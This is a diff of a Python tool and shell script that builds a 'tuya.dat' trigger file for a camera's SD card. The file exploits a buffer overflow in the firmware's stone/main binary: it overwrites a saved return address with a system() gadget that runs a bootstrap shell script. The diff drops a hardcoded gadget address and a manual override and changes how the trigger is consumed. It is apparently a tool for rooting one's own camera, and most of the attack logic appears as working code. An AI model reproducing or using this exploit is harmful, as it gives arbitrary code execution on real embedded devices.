@@ -6,7 +6,6 @@ import struct
 from pathlib import Path
 
 
-FIRMWARE_6271235_SYSTEM_SP20_GADGET = 0x0043A258
 COMMAND_OFFSET_FROM_FIELD = 0x68
 SAVED_RA_OFFSET_FROM_FIELD = 0x44
 BOOTSTRAP_COMMAND = b"sh /tmp/mnt/sdcard/factory/firstboot.sh"
@@ -112,6 +111,12 @@ patch_stone() {
 echo firstboot-start > /dev/console
 log "start"
 
+if [ -f "$SD/tuya.dat" ]; then
+    rm -f "$SD/tuya.dat" 2>> "$LOG" || fail "could not consume tuya.dat trigger"
+    sync
+    log "consumed tuya.dat trigger"
+fi
+
 [ -x "$PATCHER" ] || fail "missing patcher: $PATCHER"
 log "stone low power=$STONE_LOW_POWER"
 
@@ -208,13 +213,6 @@ start_log_pruner() {
 }
 
 prune_runtime_logs
-
-if [ -f "$SD/tuya.dat" ]; then
-    mv -f "$SD/tuya.dat" "$SD/tuya.dat.used" 2>> "$LOG" || rm -f "$SD/tuya.dat" 2>> "$LOG" || true
-    log "consumed tuya.dat trigger"
-else
-    log "tuya.dat trigger already consumed"
-fi
 
 touch /config/fmode 2>> "$LOG" || true
 sync
@@ -834,6 +832,7 @@ def write_mount(mount: Path, payload: bytes | None, *, stone_low_power: bool) ->
     (mount / "logs").mkdir(parents=True, exist_ok=True)
 
     trigger = mount / "tuya.dat"
+    (mount / "tuya.dat.used").unlink(missing_ok=True)
     if payload is None:
         trigger.unlink(missing_ok=True)
     else:
@@ -872,20 +871,9 @@ def main() -> int:
         "--stone-main",
         type=Path,
         help=(
-            "extracted stock stone/main for the target firmware; discovers the "
-            "version-specific bootstrap gadget"
+            "exact extracted stock stone/main from the firmware currently "
+            "installed on the target camera"
         ),
-    )
-    trigger.add_argument(
-        "--saved-ra",
-        type=lambda value: int(value, 0),
-        help="explicit bootstrap gadget address (advanced use)",
-    )
-    trigger.add_argument(
-        "--assume-6.2712.35",
-        dest="assume_6271235",
-        action="store_true",
-        help="explicitly use the known firmware 6.2712.35 bootstrap address",
     )
     trigger.add_argument(
         "--no-trigger",
@@ -900,18 +888,8 @@ def main() -> int:
             saved_ra = discover_system_sp20_gadget(args.stone_main)
         except (OSError, ValueError) as exc:
             parser.error(str(exc))
-        gadget_source = str(args.stone_main)
-    elif args.saved_ra is not None:
-        if not 0 <= args.saved_ra <= 0xFFFFFFFF:
-            parser.error("--saved-ra must fit in an unsigned 32-bit address")
-        saved_ra = args.saved_ra
-        gadget_source = "--saved-ra"
-    elif args.assume_6271235:
-        saved_ra = FIRMWARE_6271235_SYSTEM_SP20_GADGET
-        gadget_source = "explicit firmware 6.2712.35 assumption"
     else:
         saved_ra = None
-        gadget_source = None
 
     payload = None if saved_ra is None else build_tuya_dat(BOOTSTRAP_COMMAND, saved_ra)
 
@@ -937,7 +915,7 @@ def main() -> int:
         print(f"system() command at overflow offset 0x{COMMAND_OFFSET_FROM_FIELD:x}: {BOOTSTRAP_COMMAND.decode('ascii')}")
         print(
             f"saved RA overwrite at offset 0x{SAVED_RA_OFFSET_FROM_FIELD:x}: "
-            f"0x{saved_ra:08x} ({gadget_source})"
+            f"0x{saved_ra:08x} ({args.stone_main})"
         )
     return 0
 
